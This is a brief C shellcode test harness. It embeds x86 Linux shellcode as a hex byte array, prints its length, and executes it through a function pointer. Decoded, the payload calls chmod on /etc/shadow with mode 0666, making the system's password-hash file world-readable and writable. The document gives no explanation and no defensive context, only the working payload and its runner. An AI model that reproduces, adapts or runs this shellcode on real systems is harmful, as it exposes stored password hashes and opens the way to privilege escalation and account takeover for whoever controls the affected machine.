#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\x6a\x0f\x58\x51\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\xb6\x01\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
